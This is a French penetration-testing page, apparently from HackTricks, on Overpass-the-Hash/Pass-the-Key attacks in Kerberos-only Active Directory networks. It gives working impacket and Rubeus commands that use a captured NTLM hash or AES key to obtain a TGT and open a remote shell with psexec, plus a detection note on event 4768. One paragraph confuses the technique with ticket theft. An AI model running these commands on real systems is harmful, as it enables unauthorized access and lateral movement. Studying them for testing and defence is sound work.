## Overpasser le Hash/Passer la Clé (PTK)

Cette attaque vise à **utiliser le hash NTLM ou les clés AES de l'utilisateur pour demander des tickets Kerberos**, en alternative à la méthode courante Pass The Hash sur le protocole NTLM. Par conséquent, cela pourrait être particulièrement **utile dans les réseaux où le protocole NTLM est désactivé** et où seul **Kerberos est autorisé** en tant que protocole d'authentification.

Pour effectuer cette attaque, le **hash NTLM (ou le mot de passe) du compte utilisateur cible est nécessaire**. Ainsi, une fois qu'un hash utilisateur est obtenu, un TGT peut être demandé pour ce compte. Enfin, il est possible d'**accéder** à n'importe quel service ou machine **où le compte utilisateur a des autorisations**.
```
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Vous pouvez **spécifier** `-aesKey [clé AES]` pour spécifier l'utilisation de **AES256**.\
Vous pouvez également utiliser le ticket avec d'autres outils tels que : smbexec.py ou wmiexec.py

Problèmes possibles :

* _PyAsn1Error(‘NamedTypes can cast only scalar values’,)_ : Résolu en mettant à jour impacket vers la dernière version.
* _KDC can’t found the name_ : Résolu en utilisant le nom d'hôte au lieu de l'adresse IP, car elle n'était pas reconnue par Kerberos KDC.
```
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Ce type d'attaque est similaire à **Pass the Key**, mais au lieu d'utiliser des hachages pour demander un ticket, le ticket lui-même est volé et utilisé pour s'authentifier en tant que propriétaire.

{% hint style="warning" %}
Lorsqu'un TGT est demandé, l'événement `4768: A Kerberos authentication ticket (TGT) was requested` est généré. Vous pouvez voir dans la sortie ci-dessus que le type de clé est **RC4-HMAC** (0x17), mais le type par défaut pour Windows est maintenant **AES256** (0x12).
{% endhint %}
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Références

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
